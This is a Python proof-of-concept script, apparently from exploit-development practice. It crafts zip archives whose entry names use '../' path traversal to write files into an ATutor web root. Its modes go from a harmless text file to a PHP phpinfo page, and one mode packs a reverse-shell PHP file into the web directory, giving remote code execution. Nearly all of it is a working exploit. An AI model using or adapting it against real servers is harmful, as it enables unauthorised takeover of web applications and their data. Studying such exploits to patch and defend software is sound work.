#!/usr/bin/python
import sys
import zipfile
try:
    from StringIO import StringIO       ## for Python 2
except ImportError:
    from io import BytesIO as StringIO  ## for Python 3

# Creates a file in a directory (poc/poc.ext) and then compresses it into an archive called poc.zip
def _zip(_type):
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    
    if (_type == "zip"):
        z.writestr('poc/poc.txt', 'pocstring')
        z.close()
    elif (_type == "xml"):
        z.writestr('poc/poc.txt', 'pocstring')
        z.writestr('imsmanifest.xml', '<validTag></validTag>')
        z.close()
    elif (_type == "invalid"):
        z.writestr('poc/poc.txt', 'pocstring')
        z.writestr('imsmanifest.xml', 'invalid xml!')
        z.close()
    elif (_type == "dir"):
        z.writestr('../../../../../tmp/poc/poc.txt', 'pocstring')
        z.writestr('imsmanifest.xml', 'invalid xml!')
        z.close()
    elif (_type == "web"):
        z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.txt', 'pocstring')
        z.writestr('imsmanifest.xml', 'invalid xml!')
        z.close()
    elif (_type == "phtml"):
        z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml', '<?php phpinfo(); ?>')
        z.writestr('imsmanifest.xml', 'invalid xml!')
        z.close()
    elif (_type == "shell"):
        shell_file = open('php-reverse-shell.php', 'rb')
        z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml', shell_file.read())
        z.writestr('imsmanifest.xml', 'invalid xml!')
        z.close()
        shell_file.close()
    else:
        z.close()
    
    zip_file = open('poc.zip', 'wb')
    zip_file.write(f.getvalue())
    zip_file.close()
    
    print("[+] poc.zip file is created")
    
    return zip_file

def main():
    if len(sys.argv) != 3:
        print("[!] usage: %s <target> type:zip/xml/invalid/dir/web/phtml/shell" % sys.argv[0])
        print('[!] eg: python %s atutor.local phtml' % sys.argv[0])
        sys.exit(-1)

    host = sys.argv[1]
    _type = sys.argv[2]
    zip_file = _zip(_type)
    
if __name__ == "__main__":
    main()